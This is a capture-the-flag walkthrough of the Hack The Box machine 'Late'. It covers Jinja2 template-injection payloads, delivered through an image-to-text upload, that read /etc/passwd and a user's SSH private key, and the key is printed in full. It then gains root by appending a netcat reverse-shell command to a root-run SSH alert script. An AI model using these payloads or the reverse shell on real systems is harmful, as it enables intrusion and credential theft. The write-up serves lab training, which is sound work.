# 🕑 Late

Link: [https://app.hackthebox.com/machines/463](https://app.hackthebox.com/machines/463)

### Nmap Scan

Let's start with enumeration with Nmap: `nmap -sS -A -sC -sV -T5 -oN scan.txt 10.129.132.140`

```
Nmap scan report for 10.129.132.140
Host is up (0.082s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   83.66 ms 10.10.14.1
2   83.65 ms 10.129.132.140
```

Port 22 & 80 are open. HTTP is hosted on `Port 80`

Let's visit that in our browser

### Port 80

*[Image: port 80]*

By seeing the website there isn't that much.

I found one link in the source code

*[Image: source code]*

To visit that page, we have to add `images.late.htb`  to our `HOST`

*[Image: host]*

after editing `/etc/hosts` and adding our machine's IP we are good to do.

### images.late.htb

This page converts any image to text like on OCR. So, let's upload an image and let's check the response

*[Image: normal text]*

The output 👇

```
<p>If you want to turn an image into a text document, you came to the right place.
</p>
```

Here we can see that it has extracted the text from the image.

{% hint style="info" %}
This image-to-text only detects some of the fonts I am currently using: `ms word - font - bahnschrift landscape` if this does not work try changing the fonts and size
{% endhint %}

Here we can see in the heading its written "flask" (information disclosure). From my previous experiences most of the flask-based application are vulnerable to SSTI

Let's try to upload an image containing SSTI payload \{{7\*7\}} and check the response

```
<p>49
</p>
```

Yess! It's vulnerable to SSTI.&#x20;

Check this source for SSTI [https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee](https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee)&#x20;

Let's try `{{congif.items()}}`

.png>)

Response 👇

```
<p>dict_items([(&#39;ENV&#39;, &#39;production&#39;), (&#39;DEBUG&#39;, False), (&#39;TESTING&#39;, False), (&#39;PROPAGATE_EXCEPTIONS&#39;, None), (&#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;, None), (&#39;SECRET_KEY&#39;, b&#39;_5#y2L&#34;F4Q8z\n\xec]/&#39;), (&#39;PERMANENT_SESSION_LIFETIME&#39;, datetime.timedelta(31)), (&#39;USE_X_SENDFILE&#39;, False), (&#39;SERVER_NAME&#39;, None), (&#39;APPLICATION_ROOT&#39;, &#39;/&#39;), (&#39;SESSION_COOKIE_NAME&#39;, &#39;session&#39;), (&#39;SESSION_COOKIE_DOMAIN&#39;, False), (&#39;SESSION_COOKIE_PATH&#39;, None), (&#39;SESSION_COOKIE_HTTPONLY&#39;, True), (&#39;SESSION_COOKIE_SECURE&#39;, False), (&#39;SESSION_COOKIE_SAMESITE&#39;, None), (&#39;SESSION_REFRESH_EACH_REQUEST&#39;, True), (&#39;MAX_CONTENT_LENGTH&#39;, None), (&#39;SEND_FILE_MAX_AGE_DEFAULT&#39;, None), (&#39;TRAP_BAD_REQUEST_ERRORS&#39;, None), (&#39;TRAP_HTTP_EXCEPTIONS&#39;, False), (&#39;EXPLAIN_TEMPLATE_LOADING&#39;, False), (&#39;PREFERRED_URL_SCHEME&#39;, &#39;http&#39;), (&#39;JSON_AS_ASCII&#39;, True), (&#39;JSON_SORT_KEYS&#39;, True), (&#39;JSONIFY_PRETTYPRINT_REGULAR&#39;, False), (&#39;JSONIFY_MIMETYPE&#39;, &#39;application/json&#39;), (&#39;TEMPLATES_AUTO_RELOAD&#39;, None), (&#39;MAX_COOKIE_SIZE&#39;, 4093)])
</p>
```

But there wasn't any important or useful files.

Let's Check the `passwd` file so we can get the usernames.&#x20;

Use the payload listed here [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2) (Jinja2- Read Remote file)

after too many payloads this worked `{{ get_flashed_messages.`**`globals`**`.`**`builtins`**`.open("/etc/passwd").read() }}`

*[Image: passwd]*

the response 👇

```
<p>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash
rtkit:x:111:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
avahi:x:113:116:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:114:117:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
saned:x:115:119::/var/lib/saned:/usr/sbin/nologin
colord:x:116:120:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:117:121:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
geoclue:x:118:123::/var/lib/geoclue:/usr/sbin/nologin
smmta:x:119:124:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin
smmsp:x:120:125:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin

</p>
```

So, we got the user that we need `svc_acc`

### User Flag

Now, we can also read the User flag

*[Image: user flag]*

The response 👇

```
<p>91e490aaef4a2b901975a48022e589ae

</p>
```

Okay, now we have to figure out How we can get the `Rev shell`

### SSH: Getting Shell

Let's try to read the `id_rsa` _of the user `svc_acc`_

using this payload: `{{ get_flashed_messages.`**`globals`**`.`**`builtins`**`.open("/home/svc_acc/.ssh/id_rsa").read() }}`

*[Image: id\_rsa]*

The response 👇

```
<p>-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
-----END RSA PRIVATE KEY-----

</p>
```

Now, copy the above Private Key to our machine removing the `<p>` and `</p>`

```
chmod 600 id_rsa
ssh svc_scc@$ip -i id_rsa
```

*[Image: ssh]*

We are in!

### Privilege Escalation

Let's copy [linpeas](https://github.com/carlospolop/PEASS-ng/releases/tag/20220612) to machine via SCP

```
scp -i id_rsa linpeas.sh svc_acc@$ip:.
```

*[Image: scp]*

Let's run `linpeas.sh`

```
chmod +x linpeas.sh
./linpeas.sh
```

we got some interesting files with root privileges `/usr/local/sbin`

*[Image: linpeas.sh]*

Let's check `ssh-alert.sh`

*[Image: ssh-alert.sh]*

Looks like this running whenever a user gets connected using the `ssh`&#x20;

So, we can modify this file and get the root flag

Let's check if this is executing as root or not. We can use [pspy64](https://github.com/DominicBreuker/pspy) tool which is pre-installed in the machine.

```
pspy64
```

Now re-login in some other terminal with `ssh` .Here we can see that `ssh-alert.sh` is running with `UID=0` which means that is running with root permissions.

We can get the root flag with two ways.

#### <mark style="color:orange;">**Method 1: With rev shell**</mark>

Let's check if we have `nc` on the machine or not.

*[Image: nc -h]*

Okay we have `nc` . We can just append the file contents of `ssh-alert.sh` to get a rev shell

{% hint style="warning" %}
we cannot edit `ssh-slert.sh` as we don't have any permission to edit that. So, we can only append that file using >>
{% endhint %}

```
echo -n 'nc -e sh {ip} 9004' >> /usr/local/sbin/ssh-alert.sh
```

Now, setup a listener on another terminal `nc -lnvp 9004`

Re-login with a SSH in the `svc_acc` to trigger our script.\
Boom! now we got a Rev shell on our listener, and we are Root!

#### <mark style="color:orange;">**Method 2: Copying root.txt to our unprivileged user**</mark>&#x20;

{% hint style="warning" %}
we cannot edit `ssh-slert.sh` as we don't have any permission to edit that. So, we can only append that file using >>
{% endhint %}

We can just use the cat command to read the root.txt and append that to our `svc_acc` without any rev shell

1. Create a `flag.txt` file under `/home/svc_acc/`

```
touch /home/svc_acc/flag.txt
```

&#x20;2\. append our cat command to read the `/root/root.txt` to `ssh-alert.sh`

```
echo 'cat /root/root.txt >> /home/svc_acc/flag.txt' >> /usr/local/sbin/ssh-alert.sh
```

&#x20;3\. Re-login with a SSH in the `svc_acc` to trigger our script.

&#x20;4\. Check the `flag.txt` that we created in `/home/svc_acc`

*[Image: root.txt]*

BOOM! Pwned!

**Thanks for reading. Hope you have enjoyed and learned something.**

<mark style="color:green;">**For any questions feel free to ping me on**</mark> [_<mark style="color:green;">**Twitter**</mark>_](https://twitter.com/0xs0m) <mark style="color:green;">**or**</mark> [_<mark style="color:green;">**LinkedIn**</mark>_](https://www.linkedin.com/in/somchandra17/)\

